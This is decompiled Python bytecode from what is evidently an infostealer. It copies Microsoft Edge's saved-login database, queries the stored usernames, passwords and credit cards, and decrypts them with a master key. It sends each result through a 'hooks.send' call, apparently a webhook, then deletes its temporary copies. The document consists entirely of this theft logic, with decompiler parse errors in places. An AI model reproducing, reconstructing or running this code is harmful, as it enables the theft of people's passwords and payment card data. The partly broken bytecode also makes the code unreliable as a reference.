 L. 359         6  LOAD_GLOBAL              os
                8  LOAD_ATTR                environ
               10  LOAD_STR                 'USERPROFILE'
               12  BINARY_SUBSCR    
               14  LOAD_GLOBAL              os
               16  LOAD_ATTR                sep
               18  BINARY_ADD       

 L. 360        20  LOAD_STR                 'AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Login Data'

 L. 359        22  BINARY_ADD       
               24  STORE_FAST               'login_db'

 L. 361        26  SETUP_FINALLY        44  'to 44'

 L. 362        28  LOAD_GLOBAL              shutil
               30  LOAD_METHOD              copy2
               32  LOAD_FAST                'login_db'

 L. 363        34  LOAD_STR                 'Loginvault.db'

 L. 362        36  CALL_METHOD_2         2  ''
               38  POP_TOP          
               40  POP_BLOCK        
               42  JUMP_FORWARD         66  'to 66'
             44_0  COME_FROM_FINALLY    26  '26'

 L. 364        44  POP_TOP          
               46  POP_TOP          
               48  POP_TOP          

 L. 365        50  LOAD_GLOBAL              hook
               52  LOAD_METHOD              send
               54  LOAD_STR                 "error, M.E isn't installed."
               56  CALL_METHOD_1         1  ''
               58  POP_TOP          
               60  POP_EXCEPT       
               62  JUMP_FORWARD         66  'to 66'
               64  <48>             
             66_0  COME_FROM            62  '62'
             66_1  COME_FROM            42  '42'

 L. 366        66  LOAD_GLOBAL              sqlite3
               68  LOAD_METHOD              connect
               70  LOAD_STR                 'Loginvault.db'
               72  CALL_METHOD_1         1  ''
               74  STORE_FAST               'conn'

 L. 367        76  LOAD_FAST                'conn'
               78  LOAD_METHOD              cursor
               80  CALL_METHOD_0         0  ''
               82  STORE_FAST               'cursor'

 L. 369        84  SETUP_FINALLY       206  'to 206'

 L. 370        86  LOAD_FAST                'cursor'
               88  LOAD_METHOD              execute

 L. 371        90  LOAD_STR                 'SELECT action_url, username_value, password_value FROM logins'

 L. 370        92  CALL_METHOD_1         1  ''
               94  POP_TOP          

 L. 372        96  LOAD_FAST                'cursor'
               98  LOAD_METHOD              fetchall
              100  CALL_METHOD_0         0  ''
              102  GET_ITER         
            104_0  COME_FROM           156  '156'
              104  FOR_ITER            202  'to 202'
              106  STORE_FAST               'r'

 L. 373       108  LOAD_FAST                'r'
              110  LOAD_CONST               0
              112  BINARY_SUBSCR    
              114  STORE_FAST               'url'

 L. 374       116  LOAD_FAST                'r'
              118  LOAD_CONST               1
              120  BINARY_SUBSCR    
              122  STORE_FAST               'username'

 L. 375       124  LOAD_FAST                'r'
              126  LOAD_CONST               2
              128  BINARY_SUBSCR    
              130  STORE_FAST               'encrypted_password'

 L. 376       132  LOAD_GLOBAL              decrypt_password

 L. 377       134  LOAD_FAST                'encrypted_password'
              136  LOAD_FAST                'master_key'

 L. 376       138  CALL_FUNCTION_2       2  ''
              140  STORE_FAST               'decrypted_password'

 L. 378       142  LOAD_FAST                'username'
              144  LOAD_STR                 ''
              146  COMPARE_OP               !=
              148  POP_JUMP_IF_TRUE    158  'to 158'
              150  LOAD_FAST                'decrypted_password'
              152  LOAD_STR                 ''
              154  COMPARE_OP               !=
              156  POP_JUMP_IF_FALSE   104  'to 104'
            158_0  COME_FROM           148  '148'

 L. 379       158  LOAD_GLOBAL              hooks
              160  LOAD_METHOD              send
              162  LOAD_STR                 'URL: '
              164  LOAD_FAST                'url'
              166  BINARY_ADD       
              168  LOAD_STR                 '\nUSER: '
              170  BINARY_ADD       
              172  LOAD_FAST                'username'
              174  BINARY_ADD       

 L. 380       176  LOAD_STR                 '\nPASSWORD: '

 L. 379       178  BINARY_ADD       

 L. 380       180  LOAD_FAST                'decrypted_password'

 L. 379       182  BINARY_ADD       

 L. 380       184  LOAD_STR                 '\n'

 L. 379       186  BINARY_ADD       

 L. 380       188  LOAD_STR                 '**********'

 L. 379       190  BINARY_ADD       

 L. 380       192  LOAD_STR                 '\n'

 L. 379       194  BINARY_ADD       
              196  CALL_METHOD_1         1  ''
              198  POP_TOP          
              200  JUMP_BACK           104  'to 104'
              202  POP_BLOCK        
              204  JUMP_FORWARD        242  'to 242'
            206_0  COME_FROM_FINALLY    84  '84'

 L. 381       206  DUP_TOP          
              208  LOAD_GLOBAL              Exception
              210  <121>               240  ''
              212  POP_TOP          
              214  STORE_FAST               'e'
              216  POP_TOP          
              218  SETUP_FINALLY       232  'to 232'

 L. 382       220  POP_BLOCK        
              222  POP_EXCEPT       
              224  LOAD_CONST               None
              226  STORE_FAST               'e'
              228  DELETE_FAST              'e'
              230  JUMP_FORWARD        242  'to 242'
            232_0  COME_FROM_FINALLY   218  '218'
              232  LOAD_CONST               None
              234  STORE_FAST               'e'
              236  DELETE_FAST              'e'
              238  <48>             
              240  <48>             
            242_0  COME_FROM           230  '230'
            242_1  COME_FROM           204  '204'

 L. 384       242  LOAD_FAST                'cursor'
              244  LOAD_METHOD              close
              246  CALL_METHOD_0         0  ''
              248  POP_TOP          

 L. 385       250  LOAD_FAST                'conn'
              252  LOAD_METHOD              close
              254  CALL_METHOD_0         0  ''
              256  POP_TOP          

 L. 386       258  SETUP_FINALLY       274  'to 274'

 L. 387       260  LOAD_GLOBAL              os
              262  LOAD_METHOD              remove
              264  LOAD_STR                 'Loginvault.db'
              266  CALL_METHOD_1         1  ''
              268  POP_TOP          
              270  POP_BLOCK        
              272  JUMP_FORWARD        312  'to 312'
            274_0  COME_FROM_FINALLY   258  '258'

 L. 388       274  DUP_TOP          
              276  LOAD_GLOBAL              Exception
          278_280  <121>               310  ''
              282  POP_TOP          
              284  STORE_FAST               'e'
              286  POP_TOP          
              288  SETUP_FINALLY       302  'to 302'

 L. 389       290  POP_BLOCK        
              292  POP_EXCEPT       
              294  LOAD_CONST               None
              296  STORE_FAST               'e'
              298  DELETE_FAST              'e'
              300  JUMP_FORWARD        312  'to 312'
            302_0  COME_FROM_FINALLY   288  '288'
              302  LOAD_CONST               None
              304  STORE_FAST               'e'
              306  DELETE_FAST              'e'
              308  <48>             
              310  <48>             
            312_0  COME_FROM           300  '300'
            312_1  COME_FROM           272  '272'

Parse error at or near `<48>' instruction at offset 64


    def get_credit_cards1--- This code section failed: ---

 L. 393         0  LOAD_GLOBAL              get_master_key
                2  CALL_FUNCTION_0       0  ''
                4  STORE_FAST               'master_key'

 L. 394         6  LOAD_GLOBAL              os
                8  LOAD_ATTR                environ
               10  LOAD_STR                 'USERPROFILE'
               12  BINARY_SUBSCR    
               14  LOAD_GLOBAL              os
               16  LOAD_ATTR                sep
               18  BINARY_ADD       

 L. 395        20  LOAD_STR                 'AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Login Data'

 L. 394        22  BINARY_ADD       
               24  STORE_FAST               'login_db'

 L. 396        26  SETUP_FINALLY        44  'to 44'

 L. 397        28  LOAD_GLOBAL              shutil
               30  LOAD_METHOD              copy2
               32  LOAD_FAST                'login_db'
               34  LOAD_STR                 'CCvault.db'
               36  CALL_METHOD_2         2  ''
               38  POP_TOP          
               40  POP_BLOCK        
               42  JUMP_FORWARD        102  'to 102'
             44_0  COME_FROM_FINALLY    26  '26'

 L. 398        44  POP_TOP          
               46  POP_TOP          
               48  POP_TOP          

 L. 399        50  LOAD_GLOBAL              hook
               52  LOAD_METHOD              send
               54  LOAD_STR                 "error, M.E isn't installed."
               56  CALL_METHOD_1         1  ''
               58  POP_TOP          

 L. 400        60  LOAD_GLOBAL              sqlite3
               62  LOAD_METHOD              connect
               64  LOAD_STR                 'Loginvault.db'
               66  CALL_METHOD_1         1  ''
               68  STORE_FAST               'conn'

 L. 401        70  LOAD_FAST                'conn'
               72  LOAD_METHOD              cursor
               74  CALL_METHOD_0         0  ''
               76  STORE_FAST               'cursor'

 L. 402        78  LOAD_GLOBAL              sqlite3
               80  LOAD_METHOD              connect
               82  LOAD_STR                 'CCvault.db'
               84  CALL_METHOD_1         1  ''
               86  STORE_FAST               'conn'

 L. 403        88  LOAD_FAST                'conn'
               90  LOAD_METHOD              cursor
               92  CALL_METHOD_0         0  ''
               94  STORE_FAST               'cursor'
               96  POP_EXCEPT       
               98  JUMP_FORWARD        102  'to 102'
              100  <48>             
            102_0  COME_FROM            98  '98'
            102_1  COME_FROM            42  '42'

 L. 405       102  SETUP_FINALLY       232  'to 232'

 L. 406       104  LOAD_FAST                'cursor'
              106  LOAD_METHOD              execute
              108  LOAD_STR                 'SELECT * FROM credit_cards'
              110  CALL_METHOD_1         1  ''
              112  POP_TOP          

 L. 407       114  LOAD_FAST                'cursor'
              116  LOAD_METHOD              fetchall
              118  CALL_METHOD_0         0  ''
              120  GET_ITER         
              122  FOR_ITER            228  'to 228'
              124  STORE_FAST               'r'

 L. 408       126  LOAD_FAST                'r'
              128  LOAD_CONST               1
              130  BINARY_SUBSCR    
              132  STORE_FAST               'username'

 L. 409       134  LOAD_FAST                'r'
              136  LOAD_CONST               4
              138  BINARY_SUBSCR    
              140  STORE_FAST               'encrypted_password'

 L. 410       142  LOAD_GLOBAL              decrypt_password

 L. 411       144  LOAD_FAST                'encrypted_password'
              146  LOAD_FAST                'master_key'

 L. 410       148  CALL_FUNCTION_2       2  ''
              150  STORE_FAST               'decrypted_password'

 L. 412       152  LOAD_FAST                'r'
              154  LOAD_CONST               2
              156  BINARY_SUBSCR    
              158  STORE_FAST               'expire_mon'

 L. 413       160  LOAD_FAST                'r'
              162  LOAD_CONST               3
              164  BINARY_SUBSCR    
              166  STORE_FAST               'expire_year'

 L. 414       168  LOAD_GLOBAL              hooks
              170  LOAD_METHOD              send
              172  LOAD_STR                 'CARD-NAME: '
              174  LOAD_FAST                'username'
              176  BINARY_ADD       
              178  LOAD_STR                 '\nNUMBER: '
              180  BINARY_ADD       
              182  LOAD_FAST                'decrypted_password'
              184  BINARY_ADD       
              186  LOAD_STR                 '\nEXPIRY M: '
              188  BINARY_ADD       

 L. 415       190  LOAD_GLOBAL              str
              192  LOAD_FAST                'expire_mon'
              194  CALL_FUNCTION_1       1  ''

 L. 414       196  BINARY_ADD       

 L. 415       198  LOAD_STR                 '\nEXPIRY Y: '

 L. 414       200  BINARY_ADD       

 L. 415       202  LOAD_GLOBAL              str
              204  LOAD_FAST                'expire_year'
              206  CALL_FUNCTION_1       1  ''

 L. 414       208  BINARY_ADD       

 L. 415       210  LOAD_STR                 '\n'

 L. 414       212  BINARY_ADD       

 L. 415       214  LOAD_STR                 '**********'

 L. 414       216  BINARY_ADD       

 L. 415       218  LOAD_STR                 '\n'

 L. 414       220  BINARY_ADD       
              222  CALL_METHOD_1         1  ''
              224  POP_TOP          
              226  JUMP_BACK           122  'to 122'
              228  POP_BLOCK        
              230  JUMP_FORWARD        270  'to 270'
            232_0  COME_FROM_FINALLY   102  '102'

 L. 417       232  DUP_TOP          
              234  LOAD_GLOBAL              Exception
          236_238  <121>               268  ''
              240  POP_TOP          
              242  STORE_FAST               'e'
              244  POP_TOP          
              246  SETUP_FINALLY       260  'to 260'

 L. 418       248  POP_BLOCK        
              250  POP_EXCEPT       
              252  LOAD_CONST               None
              254  STORE_FAST               'e'
              256  DELETE_FAST              'e'
              258  JUMP_FORWARD        270  'to 270'
            260_0  COME_FROM_FINALLY   246  '246'
              260  LOAD_CONST               None
              262  STORE_FAST               'e'
              264  DELETE_FAST              'e'
              266  <48>             
              268  <48>             
            270_0  COME_FROM           258  '258'
            270_1  COME_FROM           230  '230'

 L. 420       270  LOAD_FAST                'cursor'
              272  LOAD_METHOD              close
              274  CALL_METHOD_0         0  ''
              276  POP_TOP          

 L. 421       278  LOAD_FAST                'conn'
              280  LOAD_METHOD              close
              282  CALL_METHOD_0         0  ''
              284  POP_TOP          

 L. 422       286  SETUP_FINALLY       302  'to 302'

 L. 423       288  LOAD_GLOBAL              os
              290  LOAD_METHOD              remove
              292  LOAD_STR                 'CCvault.db'
              294  CALL_METHOD_1         1  ''
              296  POP_TOP          
              298  POP_BLOCK        
              300  JUMP_FORWARD        340  'to 340'
            302_0  COME_FROM_FINALLY   286  '286'

 L. 424       302  DUP_TOP          
              304  LOAD_GLOBAL              Exception
          306_308  <121>               338  ''
              310  POP_TOP          
              312  STORE_FAST               'e'
              314  POP_TOP          
              316  SETUP_FINALLY       330  'to 330'

 L. 425       318  POP_BLOCK        
              320  POP_EXCEPT       
              322  LOAD_CONST               None
              324  STORE_FAST               'e'
              326  DELETE_FAST              'e'
              328  JUMP_FORWARD        340  'to 340'
            330_0  COME_FROM_FINALLY   316  '316'
              330  LOAD_CONST               None
              332  STORE_FAST               'e'
              334  DELETE_FAST              'e'
              336  <48>             
              338  <48>             
            340_0  COME_FROM           328  '328'
            340_1  COME_FROM           300  '300'

Parse error at or near `<48>' instruction at offset 100


    while True:
        get_password()
        get_password1()
        get_credit_cards()
        get_credit_cards1()
        os.remove('Loginvault.db')
        break